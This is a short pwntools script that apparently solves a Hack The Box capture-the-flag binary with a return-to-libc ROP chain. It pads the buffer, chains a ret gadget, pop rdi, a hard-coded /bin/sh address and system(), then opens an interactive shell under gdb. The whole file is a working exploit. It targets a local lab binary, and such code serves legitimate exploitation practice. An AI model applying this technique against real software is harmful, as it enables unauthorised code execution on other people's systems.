from pwn import *
import sys

context(log_level='debug')

# here we use a return to libc exploit, calling the system function
payload = b'A' * 85
# payload+=p64(0x4013a5) # box-ret for stack alignment
payload+=p64(0x401016) # ret
payload+=p64(0x40142b) # pop rdi
payload+=p64(0x7ffff7f6b698) # /bin/sh
payload+=p64(0x7ffff7de3d60) # system
# sys.stdout.buffer.write(b'2\n');
# sys.stdout.buffer.write(payload + b'\n');

elf = ELF('./pb')
p = elf.process()
gdb.attach(p, '''
break *box+226
''')

p.sendline(b'2')
p.sendline(payload)

p.interactive()
# success(f'Flag --> {p.recvline_contains(b"HTB").strip().decode()}')
